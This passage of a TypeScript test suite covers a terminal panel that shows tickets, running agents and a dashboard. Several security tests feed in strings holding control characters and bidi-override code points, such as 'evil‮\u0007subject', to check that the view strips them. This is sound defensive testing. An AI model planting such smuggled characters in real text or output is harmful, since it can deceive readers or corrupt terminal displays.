  expect(tabs(h)['tab:ticket'].label).toContain('gate failed');
  // Phase 08.8.1 W4 (08.7 review WR-04): a newer commit no longer hides the failed gate run; only a newer gate run does
  const later = await paneWith({ log: [{ at: now - 5, kind: 'commit', text: 'fix: header' }, gate] });
  expect(later.nodes('Box').some((b) => b.props.borderColor === '#ff6b6b')).toBe(true);
  expect(later.texts()).toContain('Gate failed');
  expect(tabs(later)['tab:ticket'].label).toContain('gate failed');
  expect(later.texts()).toContain('LOG');
  const passed = await paneWith({ log: [{ at: now - 5, kind: 'gate', text: 'gate done PASS' }, gate] });
  expect(passed.nodes('Box').some((b) => b.props.borderColor === '#ff6b6b')).toBe(false);
  expect(tabs(passed)['tab:ticket'].label).not.toContain('gate failed');
});

// Phase 08.7 D-08: the context, tokens and cost block is backlog 999.59; the tab draws none of it.
it('risk:regression the ticket tab draws no context token or cost block (D-08)', async () => {
  const h = await paneWith({ stage: 'review', review: reviewOf(), criteria: [critOf('ac-1', 'Logs in', 'passing')], log: logOf() });
  const t = h.texts();
  for (const heading of ['CRITERIA', 'LOG']) expect(t).toContain(heading);
  expect(t.some((x) => x.startsWith('REVIEW'))).toBe(true);
  expect(t.filter((x) => /\b(tokens?|cost|context)\b/i.test(x))).toEqual([]);
});

// Phase 08.7 D-04, T-08.7-12: every drawn string passes the view's clean, so no control or bidi code point reaches the pane.
it('risk:security log lines criterion titles and stage text cannot put control characters into the pane (D-04)', async () => {
  const now = Math.floor(Date.now() / 1000);
  const h = await paneWith({
    stage: 'build\u0007',
    criteria: [critOf('ac-1', 'Lo⁦gs in', 'passing')],
    log: [{ at: now - 5, kind: 'commit', text: 'evil‮\u0007subject' }],
  });
  const t = h.texts();
  expect(t).toContain('evil subject');
  expect(t).toContain('Lo gs in');
  const bad = (c: number): boolean =>
    c < 0x20 || (c >= 0x7f && c <= 0x9f) || c === 0x61c || c === 0x200e || c === 0x200f || c === 0x2028 || c === 0x2029 || (c >= 0x202a && c <= 0x202e) || (c >= 0x2066 && c <= 0x2069);
  for (const s of [...t, ...h.buttons().map((b) => String(b.label ?? ''))]) for (const ch of s) expect(bad(ch.codePointAt(0) as number)).toBe(false);
});

// Phase 08.7 D-02, T-08.7-24: a malformed review or log key is drawn as absent and the rest of the ticket still shows.
it('risk:complex-branching a malformed review or log key is drawn as absent and the rest of the ticket still shows (D-02)', async () => {
  const bad = await paneWith({ review: { round: 'x' }, criteria: [critOf('ac-1', 'Logs in', 'passing')] });
  expect(bad.texts().some((x) => x.startsWith('REVIEW'))).toBe(false);
  expect(bad.texts()).toContain('CRITERIA');
  expect(bad.texts()).toContain('Logs in');
  const text = await paneWith({ log: 'x', criteria: [critOf('ac-1', 'Logs in', 'passing')] });
  expect(text.texts()).not.toContain('LOG');
  expect(text.texts()).toContain('CRITERIA');
  const now = Math.floor(Date.now() / 1000);
  const mixed = await paneWith({
    log: [
      { at: 'x', kind: 'commit', text: 'bad at' },
      { at: now - 9, kind: 'x', text: 'bad kind' },
      { at: now - 8, kind: 'commit', text: 'good one' },
      { at: now - 7, kind: 'commit', text: 12 },
      { at: now - 6, kind: 'report', text: 'good two' },
    ],
    criteria: [critOf('ac-1', 'Logs in', 'passing')],
  });
  const t = mixed.texts();
  expect(t).toContain('LOG');
  expect(t.slice(t.indexOf('LOG') + 1).filter((x) => !/^[0-9]+[smhd]$/.test(x))).toEqual(['good one', 'good two']);
});

// ---- Phase 08.7-06: the agents block and the roster (D-01, D-02, D-03) ----

// each fake `$.agent.list()` entry carries the join key `id` (probe row A3), a label and a description the pane must never draw
const agentOf = (id: string, type: string, over: Record<string, unknown> = {}): Record<string, unknown> => ({
  id,
  type,
  status: 'running',
  startTime: Date.now() - 65500,
  label: 'secret label ' + id,
  description: 'secret description ' + id,
  ...over,
});
const subStart = (id: string): Record<string, unknown> => ({ turnId: 't-' + id, text: 'x', agentId: id });
// Phase 08.8.1-08 L-07: a running agent's mark is a spinner, so its row reads one of four glyphs before the name; the frame timer's period is the probe's rate
const spun = (name: string): RegExp => new RegExp(`^[◐◓◑◒] ${name}$`);
const isRunning = (h: Awaited<ReturnType<typeof host>>, name: string): boolean => h.texts().some((x) => spun(name).test(x));
const everyTimers = (h: Awaited<ReturnType<typeof host>>): Awaited<ReturnType<typeof host>>['timers'] => h.timers.filter((t) => t.kind === 'every');
const framePeriod = async (): Promise<number> => Math.round(1000 / (await loadView()).FRAME_RATE);

// Phase 08.7 D-01, D-02, D-03: the agents block lists the accord agents the mod saw start, a timer while one runs and its own time when it ends; the tab label counts the running ones.
it('risk:regression the agents block shows running accord agents with timers and finished ones with their time (D-01 D-02)', async () => {
  const h = await claimedPane();
  expect(h.texts()).toContain('AGENTS');
  expect(h.texts()).toContain('none running');
  expect(h.cell('none running').text.dimColor).toBe(true);
  h.agents = [agentOf('a1', 'accord-executor')];
  await h.fire('turn.start', subStart('a1'));
  expect(isRunning(h, 'executor')).toBe(true);
  expect(h.texts()).toContain('1:05');
  expect(h.texts()).not.toContain('none running');
  expect(tabs(h)['tab:ticket'].label).toContain('◐1');
  await h.fire('turn.complete', { agentId: 'a1', durationMs: 125000, reason: 'answer' });
  expect(h.texts()).toContain('✓ executor');
  expect(h.texts()).toContain('2:05');
  expect(isRunning(h, 'executor')).toBe(false);
  expect(tabs(h)['tab:ticket'].label).not.toContain('◐');
  // the block sits between the failure box and the review rounds
  const now = Math.floor(Date.now() / 1000);
  const ordered = await paneWith({ stage: 'review', review: reviewOf(), log: [{ at: now - 20, kind: 'gate', text: 'gate done FAIL: red', fail: true }] });
  const t = ordered.texts();
  expect(t.indexOf('Gate failed')).toBeGreaterThanOrEqual(0);
  expect(t.indexOf('AGENTS')).toBeGreaterThan(t.indexOf('Gate failed'));
  expect(t.indexOf('AGENTS')).toBeLessThan(t.indexOf('REVIEW r2/5 converged'));
});

// Phase 08.7 D-01, D-02: the pure row builders keep accord agents only, running first, at most six rows.
it('risk:parsing agent rows keep accord agents only rank running first and cap at six (D-01 D-02)', async () => {
  const { agentRows, isAccordAgent, mmss, AGENTS_SHOWN, ACCORD_AGENT } = await loadView();
  expect(AGENTS_SHOWN).toBe(6);
  expect(ACCORD_AGENT.test('accord-executor')).toBe(true);
  expect(['accord-executor', 'accord-x', 'accord-a-b'].map(isAccordAgent)).toEqual([true, true, true]);
  expect(['accord-', 'accord-Executor', 'xaccord-executor', 'accord-1', 'accord-x‮', 'accord-x\n', 'general-purpose', 'accord-' + 'a'.repeat(32), undefined, 7].map(isAccordAgent)).toEqual(Array(10).fill(false));
  expect([mmss(0), mmss(65000), mmss(125999), mmss(-5), mmss(NaN), mmss(Infinity), mmss(3600000)]).toEqual(['0:00', '1:05', '2:05', '0:00', '0:00', '0:00', '60:00']);
  const rows = agentRows(
    [
      { key: 'f1', type: 'accord-planner', running: false, startTime: 0, endTime: 5000, durationMs: 4000 },
      { key: 'r1', type: 'accord-executor', running: true, startTime: 1000 },
      { key: 'r2', type: 'accord-reviewer', running: true, startTime: 3000 },
      { key: 'f2', type: 'accord-critic', running: false, startTime: 0, endTime: 9000, durationMs: 9000 },
      { key: 'x', type: 'general-purpose', running: true, startTime: 4000 },
    ],
    11000,
  );
  expect(rows).toEqual([
    { key: 'r2', name: 'reviewer', running: true, time: '0:08' },
    { key: 'r1', name: 'executor', running: true, time: '0:10' },
    { key: 'f2', name: 'critic', running: false, time: '0:09' },
    { key: 'f1', name: 'planner', running: false, time: '0:04' },
  ]);
  const many = agentRows(
    Array.from({ length: 9 }, (_, i) => ({ key: 'k' + i, type: 'accord-executor', running: true, startTime: i * 1000 })),
    20000,
  );
  expect(many).toHaveLength(6);
  expect(many.map((r: any) => r.key)).toEqual(['k8', 'k7', 'k6', 'k5', 'k4', 'k3']);
});

// Phase 08.7 D-02: a subagent turn start runs no command; an accord subagent's end schedules one `show` refresh, debounced 3 seconds; one 1-second timer runs while an accord agent runs.
it('risk:concurrency subagent turns start no accord run and an accord subagent end schedules one debounced show refresh (D-02)', async () => {
  const h = await claimedPane();
  const calls = (): number => h.$.process.run.mock.calls.length;
  const base = calls();
  h.agents = [agentOf('a1', 'accord-executor'), agentOf('a2', 'accord-planner'), agentOf('g1', 'general-purpose')];
  await h.fire('turn.start', subStart('a1'));
  await h.fire('turn.start', subStart('a2'));
  await h.fire('turn.start', subStart('g1'));
  expect(calls()).toBe(base);
  // Phase 08.8.1-08 D-03: the one timer is the frame timer, at the probe's rate, in place of the 1-second tick
  expect(h.$.clock.every).toHaveBeenCalledTimes(1);
  expect(h.$.clock.every).toHaveBeenCalledWith(await framePeriod(), expect.any(Function));
  expect(h.$.clock.after).not.toHaveBeenCalled();
  await h.fire('turn.complete', { agentId: 'g1', durationMs: 10, reason: 'answer' });
  expect(h.$.clock.after).not.toHaveBeenCalled();
  await h.fire('turn.complete', { agentId: 'a1', durationMs: 10, reason: 'answer' });
  expect(h.$.clock.after).toHaveBeenCalledTimes(1);
  expect(h.$.clock.after).toHaveBeenLastCalledWith(3000, expect.any(Function));
  expect(calls()).toBe(base);
  const ticks = everyTimers(h);
  expect(ticks).toHaveLength(1);
  expect(ticks[0].cancelled).toBe(false);
  await h.fire('turn.complete', { agentId: 'a2', durationMs: 10, reason: 'answer' });
  const waits = h.timers.filter((t) => t.ms === 3000);
  expect(waits.map((t) => t.cancelled)).toEqual([true, false]);
  expect(ticks[0].cancelled).toBe(true);
  expect(calls()).toBe(base);
  await waits[1].fn();
  expect(calls()).toBe(base + 1);
  expect(h.$.process.run).toHaveBeenLastCalledWith(SHOW('ST-1'), { timeoutMs: 120000 });
  h.settle({ stdout: JSON.stringify(detailOf()) });
  await vi.waitFor(() => expect(h.inflight()).toBe(0));
});

// Phase 08.7 D-01, T-08.7-13, T-08.7-16: the filter reads the type from the list entry, never a label or a description, and a type that only looks like an accord agent never passes.
it('risk:security a non-accord subagent and a type that only looks like one are never shown (D-01)', async () => {
  const h = await claimedPane();
  const types = ['general-purpose', 'Explore', 'accord-', 'accord-Executor', 'xaccord-executor', 'accord-x‮'];
  h.agents = types.map((t, i) => agentOf('s' + i, t));
  for (let i = 0; i < types.length; i++) await h.fire('turn.start', subStart('s' + i));
  expect(h.texts()).toContain('AGENTS');
  expect(h.texts()).toContain('none running');
  expect(h.texts().some((x) => /^[◐◓◑◒✓] /.test(x))).toBe(false);
  expect(tabs(h)['tab:ticket'].label).not.toContain('◐');
  for (const x of h.texts()) {
    expect(x).not.toContain('secret label');
    expect(x).not.toContain('secret description');
  }
  // the join key is the entry's id: an event whose agentId matches no entry shows nothing
  h.agents = [agentOf('b1', 'accord-executor')];
  await h.fire('turn.start', subStart('zz'));
  expect(h.texts()).toContain('none running');
  // an accord agent shows by its type alone
  await h.fire('turn.start', subStart('b1'));
  expect(isRunning(h, 'executor')).toBe(true);
  for (const x of h.texts()) {
    expect(x).not.toContain('secret');
  }
});

// Phase 08.7 D-02: without `$.agent.list` the block is not drawn and nothing throws; without `$.clock` an accord agent's end refreshes the ticket at once.
it('risk:complex-branching without agent list or clock the pane hides the agents block and still refreshes (D-02)', async () => {
  const none = await claimedPane();
  delete none.$.agent;
  await none.fire('turn.start', subStart('a1'));
  await none.$.ui.invalidate('ui.render');
  expect(none.texts()).not.toContain('AGENTS');
  expect(none.texts()).not.toContain('none running');
  expect(none.texts()).toContain('build 1/3');
  const bare = await claimedPane();
  delete bare.$.clock;
  bare.agents = [agentOf('a1', 'accord-executor')];
  await bare.fire('turn.start', subStart('a1'));
  expect(bare.timers).toEqual([]);
  expect(isRunning(bare, 'executor')).toBe(true);
  const base = bare.$.process.run.mock.calls.length;
  await bare.fire('turn.complete', { agentId: 'a1', durationMs: 5, reason: 'answer' });
  expect(bare.$.process.run.mock.calls.length).toBe(base + 1);
  expect(bare.$.process.run).toHaveBeenLastCalledWith(SHOW('ST-1'), { timeoutMs: 120000 });
  expect(bare.timers).toEqual([]);
  bare.settle({ stdout: JSON.stringify(detailOf()) });
  await vi.waitFor(() => expect(bare.inflight()).toBe(0));
});

// Phase 08.7 D-02, T-08.7-17: a session that never opened the pane reads no agent list, runs no command and asks for no timer.
it('risk:concurrency a session that never opened the pane calls no agent list (D-02)', async () => {
  const h = await host(await loadPanel());
  h.agents = [agentOf('a1', 'accord-executor')];
  await h.fire('session.start', { cwd: '.', surface: null, isInteractive: false });
  await h.fire('turn.start', subStart('a1'));
  await h.fire('turn.complete', { agentId: 'a1', durationMs: 5, reason: 'answer' });
  expect(h.$.agent.list).not.toHaveBeenCalled();
  expect(h.$.process.run).not.toHaveBeenCalled();
  expect(h.$.clock.after).not.toHaveBeenCalled();
  expect(h.$.clock.every).not.toHaveBeenCalled();
});

// ---- Phase 08.7-06: the desktop entry (D-06) ----

// Phase 08.7 D-06: where desktop shows the pane as a widget its clicks may not arrive, so it draws the two tab summaries as plain text and no Button.
it('risk:regression a widget placement draws only the two tab summaries (D-06)', async () => {
  const h = await claimedPane();
  h.columns = 100;
  h.placement = 'widget';
  await h.$.ui.invalidate('ui.render');
  expect(h.buttons()).toEqual([]);
  expect(h.nodes('Input')).toEqual([]);
  expect(h.texts()).toEqual(['1 ticket ST-1 build', '2 dashboard 1 yours · 1 ready · 0 team']);
  // a widget cannot be told apart by its width alone: a dock placement of the same pane still draws its buttons
  h.placement = 'dock';
  await h.$.ui.invalidate('ui.render');
  expect(Object.keys(tabs(h))).toEqual(['tab:ticket', 'tab:dashboard']);
  // with no ticket in flight the widget is the hint line and the dashboard's summary line
  const none = await host(await loadPanel());
  none.columns = 100;
  none.placement = 'widget';
  await none.fire('session.start', start);
  none.settle({ stdout: twoRows });
  await vi.waitFor(() => expect(none.texts()).toEqual(['No ticket in flight in this worktree', '0 in progress, 0 ready, 0 blocked, 0 backlog, 0 done']));
  expect(none.buttons()).toEqual([]);
  expect(none.nodes('Input')).toEqual([]);
});

// Phase 08.7 D-06, T-08.7-20: when an asked open stays unplaced and a desktop client is attached, the toast names the engine's reason, cleaned; without one it is today's terminal text.
it('risk:complex-branching an asked open that desktop cannot place names the reason (D-06)', async () => {
  const h = await host(await loadPanel());
  h.surfaces = ['terminal', 'desktop'];
  h.placed = false;
  const open = h.$.ui.open.getMockImplementation() as (a: unknown) => Promise<void>;
  h.$.ui.open.mockImplementation(async (a: unknown) => {
    await open(a);
    return { isPlaced: false, reason: 'no room\u0007 for‮ a pane' };
  });
  await h.fire('command.run', { command: 'accord-panel', args: '' });
  expect(h.$.ui.toast).toHaveBeenCalledTimes(1);
  expect(h.$.ui.toast).toHaveBeenCalledWith('The accord pane could not be placed here: no room for a pane');
  const terminal = await host(await loadPanel());
  terminal.surfaces = ['terminal'];
  terminal.placed = false;
  await terminal.fire('command.run', { command: 'accord-panel', args: '' });
  expect(terminal.$.ui.toast).toHaveBeenCalledTimes(1);
  expect(terminal.$.ui.toast).toHaveBeenCalledWith('The terminal is too narrow for the accord pane: it needs 110 columns');
});

// ---- Phase 08.7-04: the dashboard tab's mini stage bars, epic bars, boxed sections and width-picked columns (D-03, D-05) ----

const barBoard = JSON.stringify(
  board({
    yours: { rows: [{ id: 'ST-1', title: 'Y', lane: 'M', stage: 'plan' }], more: 0 },
    team: { rows: [{ id: 'ST-3', lane: 'M', title: 'Mine', stage: 'build', tasksDone: 2, tasksTotal: 5 }], more: 0 },
    ready: { rows: [{ id: 'ST-5', lane: 'S', title: 'Small', stage: 'review' }, { id: 'ST-6', lane: 'R', title: 'Look', stage: 'research' }, { id: 'ST-8', title: 'No stage' }], more: 0 },
    upNext: { rows: [{ id: 'ST-7', title: 'Later', lane: 'M', stage: 'intent' }], more: 0 },
    epics: { rows: [{ id: 'EP-1', title: 'E', done: 1, total: 3 }], more: 0 },
  }),
);
async function barPane(columns?: number): Promise<Awaited<ReturnType<typeof host>>> {
  const h = await host(await loadPanel());
  h.columns = columns;
  await h.fire('session.start', start);
  h.settle({ stdout: barBoard });
  await vi.waitFor(() => expect(h.texts()).toContain('Later'));
  return h;
}
const rowKids = (h: Awaited<ReturnType<typeof host>>, id: string): { props: Record<string, any> }[] => h.row(id).children as { props: Record<string, any> }[];
const cellsOf = (box: { props: Record<string, any> }): (string | undefined)[] => (box.props.children as { props: Record<string, any> }[]).map((c) => c.props.backgroundColor);

// Phase 08.7 D-05: every lane row draws one 1-column Box per stage cell, coloured for done and current cells, every epic row a Progress, every section a round Box led by its heading.
it('risk:regression the dashboard tab draws a mini stage bar per row an epic progress bar and boxed sections (D-05)', async () => {
  const h = await barPane();
  const bar = rowKids(h, 'ST-3')[1];
  expect(bar.props).toMatchObject({ width: 5, flexShrink: 0 });
  expect(cellsOf(bar)).toEqual(['blue', 'cyan', 'yellow', undefined, undefined]);
  for (const c of bar.props.children as { props: Record<string, any> }[]) expect(c.props.width).toBe(1);
  expect(cellsOf(rowKids(h, 'ST-5')[1])).toEqual(['blue', 'yellow', 'magenta']);
  expect(cellsOf(rowKids(h, 'ST-6')[1])).toEqual(['blue', 'cyan']);
  // a row with no stage draws an empty bar cell of the same width, so the columns stay aligned
  expect(rowKids(h, 'ST-8')[1].props).toMatchObject({ width: 5 });
  expect(cellsOf(rowKids(h, 'ST-8')[1])).toEqual([]);
  const progress = h.nodes('Progress');
  expect(progress).toHaveLength(1);
  expect(progress[0].props).toMatchObject({ label: 'EP-1 children done', value: 1, max: 3, valueText: '1/3 done', color: 'green' });
  for (const heading of ['YOURS', 'TEAM', 'READY', 'UP NEXT', 'EPICS']) {
    const section = h.nodes('Box').find((n) => ((n.props.children ?? []) as any[])[0]?.props?.children?.[0] === heading);
    expect(section?.props, heading).toMatchObject({ borderStyle: 'round', marginTop: 1, flexDirection: 'column', paddingX: 1 });
    expect((section?.props.children as any[])[0].props).toMatchObject({ bold: true, color: 'cyan' });
  }
});

// Phase 08.7 D-03, D-05: the row columns follow the width the pane reports; the ticket tab's stage bar drops its labels at narrow.
it('risk:complex-branching the row columns follow the pane width the pane reports (D-03 D-05)', async () => {
  const widths: [number | undefined, string[]][] = [
    [undefined, ['ID', 'LANE', 'STAGE', 'TITLE']],
    [200, ['ID', 'LANE', 'STAGE', 'TITLE']],
    [80, ['ID', 'LANE', 'STAGE', 'TITLE']],
    [79, ['ID', 'STAGE', 'TITLE']],
    [56, ['ID', 'STAGE', 'TITLE']],
    [55, ['ID', 'TITLE']],
    [24, ['ID', 'TITLE']],
  ];
  for (const [columns, headers] of widths) {
    const h = await barPane(columns);
    const label = String(columns);
    // header row: the bar column's header is an empty Box, so a header row holds one more child than it has header texts
    expect(h.row('ID').children, label).toHaveLength(headers.length + 1);
    for (const w of ['LANE', 'STAGE', 'TITLE']) expect(h.texts().includes(w), label + ' ' + w).toBe(headers.includes(w));
    const kids = rowKids(h, 'ST-3');
    expect(kids, label).toHaveLength(headers.length + 1);
    expect(kids[1].props.width, label).toBe(5);
    expect(kids.some((k) => (k.props.children as any[])?.[0]?.props?.children?.[0] === 'M'), label).toBe(headers.includes('LANE'));
    expect(kids.some((k) => (k.props.children as any[])?.[0]?.props?.children?.[0] === 'build 2/5'), label).toBe(headers.includes('STAGE'));
    expect(h.texts().includes('build 2/5'), label).toBe(headers.includes('STAGE'));
    // the epic row keeps its id, its progress box and its title; the stage count text goes with the stage column
    const epic = h.row('EP-1').children as any[];
    expect(epic, label).toHaveLength(headers.includes('STAGE') ? 4 : 3);
    expect(epic[1].props.children[0].type, label).toBe('Progress');
    expect(h.texts().includes('1/3 done'), label).toBe(headers.includes('STAGE'));
  }
  // the ticket tab below NARROW drops the stage labels and names the current stage once
  for (const [columns, labelled] of [[100, true], [55, false]] as [number, boolean][]) {
    const h = await claimedPane();
    h.columns = columns;
    await h.$.ui.invalidate('ui.render');
    expect(h.texts().includes('intent/approach'), String(columns)).toBe(labelled);
    expect(h.texts().filter((t) => t === 'build 1/3'), String(columns)).toHaveLength(1);
  }
});

// Phase 08.7 D-05: an engine that gives no Progress element still shows the epic's count, as text, and nothing throws.
it('risk:complex-branching an engine without Progress draws the epic count as text (D-05)', async () => {
  const h = await host(await loadPanel());
  const resolve = h.$.ui.resolve;
  h.$.ui.resolve = (e: unknown) => {
    const { Progress, ...rest } = resolve(e) as Record<string, unknown>;
    void Progress;
    return rest;
  };
  await h.fire('session.start', start);
  h.settle({ stdout: barBoard });
  await vi.waitFor(() => expect(h.texts()).toContain('Later'));
  expect(h.nodes('Progress')).toEqual([]);
  expect(h.texts().filter((t) => t === '1/3 done')).toHaveLength(2);
  expect(cellsOf(rowKids(h, 'ST-3')[1])).toEqual(['blue', 'cyan', 'yellow', undefined, undefined]);
});

// Phase 08.7-04 D-02, D-06: docs/design.md records the 2026-10-14 panel exception word for word with the owner's widening and the Claude-Code-only scope, and README.md says the pane has two tabs.
it('risk:regression docs/design.md records the panel exception verbatim with its widening and its parity exception (D-02 D-06)', () => {
  const read = (path: string): string => readFileSync(new URL('../../../' + path, import.meta.url), 'utf8').replace(/\r\n/g, '\n');
  const paragraphs = read('docs/design.md').split('\n').filter((l) => l.startsWith('**Panel.**'));
  expect(paragraphs).toHaveLength(1);
  const panel = paragraphs[0];
  expect(panel).toContain('The panel must hold no logic or gate; it reads `status --json` only.');
  expect(panel).toContain('the pane may also listen to subagent events, for display only');
  // Phase 08.8.1 IN-02: the widening of the tool-call events is recorded in the same paragraph
  expect(panel).toContain('tool-call events, for display only');
  // Phase 08.8.1-09 L-02 L-03 D-03: each person's colours and motion live in the mod's own store on their machine, and motion runs within a measured budget and stops when idle
  expect(panel).toContain('never in the repository');
  expect(panel).toContain('stops when nothing does');
  for (const word of ['Parity exception', 'Desktop Code tab', 'accord show <id> --json']) expect(panel, word).toContain(word);
  expect(read('README.md')).toContain('two tabs');
});

// Phase 08.8 D-17 (IN-04): the panel is a mod file that cannot import core, so it keeps its own copy of the ticket id pattern; this holds the copy equal to core's, and drift fails here.
it("risk:security the panel's ticket id pattern is core's SAFE_ID (D-17)", () => {
  const view = readFileSync(new URL('../panel/view.js', import.meta.url), 'utf8');
  const literal = /^const SAFE_ID = \/(.+)\/([a-z]*);$/m.exec(view);
  expect(literal, 'packages/core/panel/view.js holds no `const SAFE_ID = /.../;` line').not.toBeNull();
  expect(literal?.[1]).toBe(SAFE_ID.source);
  expect(literal?.[2]).toBe(SAFE_ID.flags);
});

// ---- Phase 08.8.1-04: the ticket tab draws the CLI's warnings, the verifier's result and the newest gate run ----

const NOT_COMMITTED = 'accord/ is not committed in this repository: git ignores accord/tickets/ST-1/plan.md, so accord cannot track the stage or the tasks';
const PLAN_CHANGED = 'plan.md changed after accord gate plan passed: run accord gate plan again before building on it';
const planTasks = [1, 2, 3].map((n) => ({ n, title: `Plan task ${n}`, done: false, covers: ['ac-1'] }));
const ticketOf = async (over: Record<string, unknown>): Promise<{ view: any; mod: Record<string, any> }> => {
  const mod = await loadView();
  const got = mod.detailOutcome({ exitCode: 0, stdout: JSON.stringify(detailOf(over)), stderr: '' });
  return { mod, view: mod.ticketView({ ticket: { id: 'ST-1', state: got }, now: 100 }) };
};

// Phase 08.8.1 D-05 D-02: a not-committed warning takes the stage track's place with no count, bar or task row; a plan-changed warning shows under the held stage.
it('risk:complex-branching a not-committed warning replaces the stage track and a plan-changed warning shows under it (D-05 D-02)', async () => {
  const csa = { stage: 'plan', tasksDone: 0, tasksTotal: 3, tasks: planTasks, warnings: [{ kind: 'not-committed', text: NOT_COMMITTED }] };
  const h = await paneWith(csa);
  const t = h.texts();
  expect(t).toContain(NOT_COMMITTED);
  expect(h.cell(NOT_COMMITTED).text).toMatchObject({ bold: true, color: 'warning' });
  expect(t).not.toContain('plan');
  expect(t.some((x) => x.startsWith('build '))).toBe(false);
  expect(t.some((x) => /0\/3|0 of 3/.test(x))).toBe(false);
  expect(t.some((x) => x.startsWith('Plan task'))).toBe(false);
  expect(t).toContain('ST-1 Login form');
  expect(tabs(h)['tab:ticket'].label).toBe('1 ticket ST-1 not tracked');
  const { view: nc } = await ticketOf(csa);
  const keys = Object.keys(nc);
  expect(keys).toEqual(expect.arrayContaining(['title', 'notCommitted']));
  // Phase 08.8.1-07 L-01: the title's colours and the places' colours are display keys; no stage, task or progress key joins them
  for (const k of keys) expect(['title', 'titleRun', 'colors', 'notCommitted', 'failure', 'review', 'criteria', 'log']).toContain(k);
  expect(nc.notCommitted).toBe(NOT_COMMITTED);
  const held = await paneWith({ stage: 'build', tasksDone: 1, tasksTotal: 3, warnings: [{ kind: 'plan-changed', text: PLAN_CHANGED }] });
  const ht = held.texts();
  expect(ht).toContain('build 1/3');
  expect(ht).toContain(PLAN_CHANGED);
  expect(held.cell(PLAN_CHANGED).text).toMatchObject({ bold: true, color: 'warning', wrap: 'wrap' });
  expect(ht.indexOf(PLAN_CHANGED)).toBeGreaterThan(ht.indexOf('build 1/3'));
  const { view: pc } = await ticketOf({ warnings: [{ kind: 'plan-changed', text: PLAN_CHANGED }] });
  expect(pc.planChanged).toBe(PLAN_CHANGED);
  expect(pc.notCommitted).toBeUndefined();
  expect(pc.cells.length).toBeGreaterThan(0);
  // an unknown kind, a non-string text and a non-array `warnings` are drawn as absent; the rest of the ticket shows
  for (const warnings of [[{ kind: 'mystery', text: 'x' }], [{ kind: 'not-committed', text: 7 }], 'oops', { kind: 'not-committed', text: 'x' }, [null, 3]]) {
    const odd = await paneWith({ stage: 'build', warnings });
    expect(odd.texts()).toContain('build 1/3');
    expect(odd.texts()).toContain('CRITERIA');
    expect(tabs(odd)['tab:ticket'].label).toBe('1 ticket ST-1 build');
  }
});

// Phase 08.8.1 D-05: a warning text is cleaned like every other string that reaches the pane.
it('risk:security a warning text cannot put control characters into the pane (D-05)', async () => {
  const h = await paneWith({ warnings: [{ kind: 'not-committed', text: 'bad‮\u0007text' }] });
  expect(h.texts()).toContain('bad text');
  const g = await paneWith({ warnings: [{ kind: 'plan-changed', text: 'ev⁦il\u0007plan' }] });
  expect(g.texts()).toContain('ev il plan');
  const bad = (c: number): boolean =>
    c < 0x20 || (c >= 0x7f && c <= 0x9f) || c === 0x61c || c === 0x200e || c === 0x200f || c === 0x2028 || c === 0x2029 || (c >= 0x202a && c <= 0x202e) || (c >= 0x2066 && c <= 0x2069);
  for (const s of [...h.texts(), ...g.texts()]) for (const ch of s) expect(bad(ch.codePointAt(0) as number)).toBe(false);
});

// Phase 08.8.1 D-06: each criterion row shows the verifier's result beside its label, so a criterion the verifier passed never reads only untested.
it('risk:parsing criteria rows show the verifier result beside the label (D-06)', async () => {
  const { criteriaRows } = await loadView();
  const rows = criteriaRows([
    { ...critOf('ac-1', 'One', 'untested'), verification: 'pass' },
    { ...critOf('ac-2', 'Two', 'failing'), verification: 'fail' },
    { ...critOf('ac-3', 'Three', 'untested'), verification: 'blocked' },
    { ...critOf('ac-4', 'Four', 'untested'), verification: null },
    { ...critOf('ac-5', 'Five', 'untested'), verification: 'weird' },
  ]);
  expect(rows[0].verification).toEqual({ text: 'verify pass', color: 'green' });
  expect(rows[1].verification).toEqual({ text: 'verify fail', color: 'red' });
  expect(rows[2].verification).toEqual({ text: 'verify blocked', color: 'red' });
  expect(Object.hasOwn(rows[3], 'verification')).toBe(false);
  expect(Object.hasOwn(rows[4], 'verification')).toBe(false);
  // CSA-185's shape: four criteria the verifier passed, all labelled untested
  const four = ['One', 'Two', 'Three', 'Four'].map((title, i) => ({ ...critOf('ac-' + (i + 1), title, 'untested'), verification: 'pass' }));
  const h = await paneWith({ criteria: four });
  expect(h.texts().filter((x) => x === 'verify pass')).toHaveLength(4);
  for (const [i, title] of ['One', 'Two', 'Three', 'Four'].entries()) expect(kids(h.row(title)), title).toEqual(['ac-' + (i + 1), title, 'untested', 'verify pass']);
  expect(h.cell('verify pass').text.color).toBe('green');
  expect(h.cell('untested').text.dimColor).toBe(true);
});

// Phase 08.8.1 W4: the failure box and the gate failed mark follow the newest log entry of kind gate, not the newest entry of any kind.
it('risk:complex-branching a newer report or commit does not hide a failed gate run (W4)', async () => {
  const { failureOf, tabLabels } = await loadView();
  const fail = { kind: 'gate', at: 10, text: 'gate done FAIL: criterion ac-2 has no passing test', fail: true };
  const log = [{ kind: 'report', at: 30, text: 'fix report 1' }, { kind: 'commit', at: 20, text: 'fix: x' }, fail];
  expect(failureOf(log)).toEqual({ text: fail.text });
  const labelOf = (l: unknown[]): any =>
    tabLabels({ state: { dashboard: board() }, ticket: { id: 'ST-1', state: { ticket: detailOf({ log: l }) } }, running: 0 }).ticket;
  expect(labelOf(log).failed).toBe(true);
  expect(labelOf(log).label).toContain('gate failed');
  const pass = { kind: 'gate', at: 25, text: 'gate done PASS' };
  expect(failureOf([log[0], pass, log[1], fail])).toBeUndefined();
  expect(labelOf([log[0], pass, log[1], fail]).failed).toBeUndefined();
  expect(failureOf([log[0], log[1]])).toBeUndefined();
});

// Phase 08.8.1 W3: at the narrow width every filled stage cell holds a one-space Text, so the stage track keeps its line at the last stage.
it('risk:regression a narrow stage track keeps a line at the last stage (W3)', async () => {
  for (const [lane, stage] of [['M', 'verify'], ['S', 'review']] as const) {
    const h = await paneWith({ lane, stage, tasksDone: 3, tasksTotal: 3 });
    h.columns = 49;
    await h.$.ui.invalidate('ui.render');
    const track = h.nodes('Box').find((b) => b.props.flexDirection === 'row' && b.props.columnGap === 1 && (b.props.children as any[]).every((c) => c.props?.paddingX === 1 && c.props?.flexShrink === 0));
    expect(track, lane).toBeDefined();
    const cells = track?.props.children as El[];
    expect(cells.length, lane).toBeGreaterThanOrEqual(3);
    for (const c of cells) {
      const texts = (c.props.children as El[]).filter((x) => x.type === 'Text');
      expect(texts, lane).toHaveLength(1);
      expect(texts[0].props.children, lane).toEqual(c.props.backgroundColor ? [' '] : ['·']);
      if (!c.props.backgroundColor) expect(texts[0].props.dimColor, lane).toBe(true);
    }
    expect(cells.some((c) => c.props.backgroundColor), lane).toBe(true);
